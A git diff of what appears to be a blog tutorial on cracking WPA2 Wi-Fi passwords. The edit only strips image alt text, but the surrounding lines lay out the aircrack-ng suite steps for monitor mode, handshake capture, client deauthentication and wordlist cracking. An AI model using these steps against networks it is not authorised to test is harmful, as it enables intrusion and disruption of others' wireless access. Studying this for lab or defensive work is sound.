@@ -14,25 +14,25 @@ In this post , I will simulate the process of cracking WPA2.
 ```shell
 sudo airmon-ng start wlan0
 ```
-![image](/assets/img/wifi/demo/start.png)
+![](/assets/img/wifi/demo/start.png)
 
 - View bssid (BSSID) and channel (CH) the device we need crack
-![image](/assets/img/wifi/demo/view.png)
+![](/assets/img/wifi/demo/view.png)
 
 - Capture packet of the device
 ```shell
 sudo airodump-ng -w <capture_name> -c <channel> --bssid <bssid_device> <interface>
 ```
-![image](/assets/img/wifi/demo/capture.png)
+![](/assets/img/wifi/demo/capture.png)
 
 - Deauthen client
 ```shell
 sudo aireplay-ng -0 <number_frame> -a <ssid_device> -c <MAC_Client> <interface>
 ```
-![image](/assets/img/wifi/demo/deauthen.png)
+![](/assets/img/wifi/demo/deauthen.png)
 
 - Crack passwd
 ```shel
 sudo aircrack-ng <capture_name> -w <wordlist
 ```
-![image](/assets/img/wifi/demo/crack.png)
+![](/assets/img/wifi/demo/crack.png)
